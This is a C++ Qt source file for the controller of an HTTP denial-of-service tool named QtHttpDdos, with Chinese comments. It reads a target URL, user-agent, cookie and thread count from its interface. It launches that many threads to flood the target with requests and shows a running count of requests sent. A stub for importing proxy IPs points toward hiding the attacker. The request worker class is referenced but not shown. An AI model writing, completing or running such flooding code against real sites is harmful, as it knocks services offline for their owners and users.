#include "QtHttpDdos.h"
#include "ui_QtHttpDdos.h"

#include <QMessageBox>

QtHttpDdos::QtHttpDdos(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::QtHttpDdos)
{
    m_pFlushRequestCountTimer = new QTimer();
    m_pIsNewThread = true;
    connect(m_pFlushRequestCountTimer,SIGNAL(timeout()),this,
            SLOT(slot_flushRequestCount()));

    ui->setupUi(this);
}

QtHttpDdos::~QtHttpDdos()
{
    delete m_pFlushRequestCountTimer;
    for(int i = 0; i < m_pThreadList.length(); i++){
        m_pThreadList.at(i)->deleteLater();
    }
    delete ui;
}

void QtHttpDdos::startRequest()
{
    m_pFlushRequestCountTimer->start(100);
    QString url = ui->urlEdt->text();
    QString ua = ui->uaEdt->text();
    QString cookie = ui->cookieEdt->text();
    int count = ui->runCountEdt->text().toInt();
    //第一次点击开始，新建线程
    if(m_pIsNewThread){
        for(int i = 0;i < count; i++){
            QThread *thread = new QThread;
            m_pThreadList.enqueue(thread);

            QHttpThread *http_request = new QHttpThread(url,count,ua,cookie);

            m_pHttpList.enqueue(http_request);

            http_request->moveToThread(thread);
        }
        startThread();
    }else{
        //开启暂停的线程
        for(int i = 0; i < m_pHttpList.length(); i++){
            m_pHttpList[i]->startThread();
        }
    }

}
//停止发起请求
void QtHttpDdos::stopRequest()
{
    m_pFlushRequestCountTimer->stop();
    for(int i = 0; i < m_pThreadList.length(); i++){
        m_pHttpList.at(i)->stopThread();
    }
}
//开启线程
void QtHttpDdos::startThread()
{
    for(int i = 0; i < m_pThreadList.length(); i++){
        m_pHttpList.at(i)->run();
        m_pThreadList.at(i)->start();
    }
}
//开始/暂停请求
void QtHttpDdos::on_controllerpbn_clicked()
{
    if(ui->controllerpbn->text() == "start"){
        ui->controllerpbn->setText("stop");
        startRequest();
    }else{
        ui->controllerpbn->setText("start");
        stopRequest();
    }
}
//导入代理ip
void QtHttpDdos::on_importIpbtn_clicked()
{
    QMessageBox::information(this,"提示","该功能正在开发");
}
//刷新界面访问次数
void QtHttpDdos::slot_flushRequestCount()
{
    int64_t totalCount = 0;
    for(int i = 0; i < m_pHttpList.length(); i++){
         totalCount += m_pHttpList[i]->getRequestCount();
    }

    if(totalCount < 0)
        totalCount = 99999999999999999;
    ui->requestCountLab->setText(QString::number(totalCount));
}


